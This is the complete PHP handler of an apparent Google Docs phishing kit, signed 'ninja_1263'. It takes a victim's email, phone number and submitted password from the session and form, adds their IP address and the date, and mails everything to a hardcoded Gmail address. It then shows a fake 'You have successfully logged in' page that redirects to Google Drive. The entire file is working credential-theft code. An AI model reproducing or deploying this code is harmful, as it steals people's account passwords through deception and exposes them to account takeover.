<?php
###################################
// Don't change anything here
// Created By ninja_1263
// From ninja
###################################

ini_set("output_buffering",4096);
session_start();

$loginemail = $_SESSION['usname'];
$loginpass =  $_SESSION['upassword'];


$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "---------=ReZulT2=---------\n";
$message .= "Email: $loginemail\n";
$message .= "phone: $loginpass\n";
$message .= "Password: ".$_POST['pcode']."\n";
$message .= "---------=IP Adress & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------=Ninja_1263=---------\n";




$sent ="alivesofts2010@gmail.com";




$subject = "Googledocs ";
$headers = "De-Gold: info<g:)>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{

mail($sent,$subject,$message,$headers);
}
header("");
?>

<meta http-equiv="refresh" content="7;URL=https://www.google.com/intl/en/drive/"><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<link rel="shortcut icon" href="http://ssl.gstatic.com/docs/doclist/images/infinite_arrow_favicon_4.ico">
<html>

<title>Loading...</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>

<body bgcolor="#ffffff" text="#000000">

<div>
<center>
  <p><b>Thank you </b>
      <br><br>
      <b><font size="3">You have successfully logged in.</font></b></p>
  <p><strong><font color="#0000FF">You will now be redirected to Google document in 5 seconds, please wait ...</font></strong></p>
  <p><img src="loadingAnimation.gif" width="208" height="13"></p>
</center>
</div>
</body>
</html>